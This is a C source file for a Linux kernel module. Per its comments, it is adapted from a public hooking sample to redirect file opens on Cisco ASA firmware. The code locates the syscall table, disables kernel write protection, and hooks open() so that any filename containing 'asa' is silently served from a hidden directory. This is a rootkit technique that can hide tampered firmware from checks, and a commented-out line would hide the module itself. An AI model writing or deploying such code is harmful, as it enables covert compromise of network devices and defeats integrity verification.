#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/syscalls.h>
#include <asm/errno.h>
#include <asm/unistd.h>
#include <linux/mman.h>
#include <asm/proto.h>
#include <asm/delay.h>
#include <linux/init.h>
#include <linux/highmem.h>
#include <linux/sched.h>
#include <linux/namei.h>
#include <linux/file.h>
#include <linux/highuid.h>
#include <linux/fs.h>
#include <linux/delay.h>    // loops_per_jiffy

// Based on LKM sample at https://github.com/typoon/lkms/blob/master/hook/README.md
// Modified slightly for both 32bit and 64bit compatibility  
// Cisco ASA firmware redirection LKM hooks open()



#define CR0_WP 0x00010000   // Write Protect Bit (CR0:16)

MODULE_LICENSE("GPL");

void **syscall_table;
unsigned long **find_sys_call_table(void);

asmlinkage long (*orig_sys_open)(const char __user *filename, int flags, int mode);

unsigned long **find_sys_call_table() {
    unsigned long ptr;
    unsigned long *p;

    for (ptr = (unsigned long)unlock_kernel;
         ptr < (unsigned long)&loops_per_jiffy;
         ptr += sizeof(void *)) {
             
        p = (unsigned long *)ptr;

        if (p[__NR_close] == (unsigned long)sys_close) {
            printk(KERN_DEBUG "Found the sys_call_table!!!\n");
            return (unsigned long **)p;
        }
    }
    
    return NULL;
}

asmlinkage long my_sys_open(const char __user *filename, int flags, int mode) {
        int error;
        struct nameidata nd,tmp_nd;
        mm_segment_t fs;
		char hidden_dir[28]="/mnt/disk0/.private/.cache/";
		char *full_path;
		char *asa_string;
		
        error=path_lookup(filename,0,&nd);
        if(!error){
				asa_string = strstr(filename,"asa");
				if(asa_string){ 
					printk(KERN_ALERT "Found \"asa\" in the filename !!\n");
					full_path = kmalloc((strlen(hidden_dir)+strlen(asa_string)+1), GFP_ATOMIC);
					memcpy(full_path, hidden_dir,strlen(hidden_dir));
					memcpy(full_path+strlen(hidden_dir),asa_string,strlen(asa_string)+1);
					fs=get_fs();
					set_fs(get_ds( ));
					error=path_lookup(full_path,0,&tmp_nd);
					if(!error){
						printk(KERN_ALERT "Found a matching filename in the legit storage area !!\n");
						printk(KERN_ALERT "Redirecting open() to legit version!!\n");
						return orig_sys_open(full_path,flags,mode);
					}
				}
		}
        return orig_sys_open(filename,flags,mode);

}

int __init hook_init(void)
{
    int ret;
    unsigned long addr;
    unsigned long cr0;
 //   list_del_init(&__this_module.list);
	
	
    syscall_table = (void **)find_sys_call_table();

    if (!syscall_table) {
        printk(KERN_DEBUG "Cannot find the system call address\n"); 
        return -1;
    }

    cr0 = read_cr0();
    write_cr0(cr0 & ~CR0_WP);

    addr = (unsigned long)syscall_table;
    ret = set_memory_rw(PAGE_ALIGN(addr) - PAGE_SIZE, 3);
    if(ret) {
        printk(KERN_DEBUG "Cannot set the memory to rw (%d) at addr %16lX\n", ret, PAGE_ALIGN(addr) - PAGE_SIZE);
    } else {
        printk(KERN_DEBUG "3 pages set to rw");
    }
    
	  orig_sys_open = syscall_table[__NR_open];
	  syscall_table[__NR_open] = my_sys_open;
      write_cr0(cr0);
  
    return 0;
}

static void __exit hook_exit(void)
{
    unsigned long cr0;
    
    cr0 = read_cr0();
    write_cr0(cr0 & ~CR0_WP);
    syscall_table[__NR_open] = orig_sys_open;
    write_cr0(cr0);
}

module_init(hook_init);
module_exit(hook_exit);
